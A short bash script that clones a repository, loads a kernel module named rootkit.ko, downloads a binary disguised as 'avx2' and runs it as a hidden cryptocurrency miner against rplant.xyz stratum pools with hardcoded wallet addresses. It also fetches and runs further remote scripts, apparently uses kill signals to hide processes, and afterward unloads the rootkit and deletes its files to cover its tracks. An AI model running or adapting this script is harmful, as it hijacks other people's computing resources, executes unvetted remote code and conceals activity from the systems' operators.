#!/bin/bash 
git clone https://github.com/BatiKangkung/Kerecek
# sudo apt-get update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.14.0 -y && npm i -g node-process-hider 
sudo apt-get install cpulimit
cd Kerecek/
rm -rf avx2
# ph add avx2 
cpulimit -l 180 -e avx2 &
make
dmesg -C
insmod rootkit.ko
dmesg
wget -O avx2 https://gitlab.com/bolihufu.avefomah/semaphore-test/raw/master/vkax
chmod +x avx2
# cpulimit -l 180 -e avx2 &
# ./avx2 -a mike -o stratum+tcps://stratum-na.rplant.xyz:17040 -u XoL3WHgSqF3mZcKajC3JG15VAhZXtdGYR1.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
# ./avx2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null & 
# ./avx2 -a minotaurx -o stratum+tcps://stratum-na.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
./avx2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q9fc7uqt9q4ngd7rf6lzv266adhnwngf70xcmhe.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
uname -a
pkill -31 avx2
pkill -31 cpulimit
wget https://github.com/BatiKangkung/KangKung/raw/master/time && chmod +x time
timeout 300 ./time
# time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
wget https://raw.githubusercontent.com/Sushrut1101/Ubuntu-Tmate/master/spam.sh && chmod +x spam.sh
timeout 265 ./spam.sh
rmmod rootkit
dmesg
pkill -31 avx2
pkill -31 cpulimit
cd ..
rm -rf Kerecek
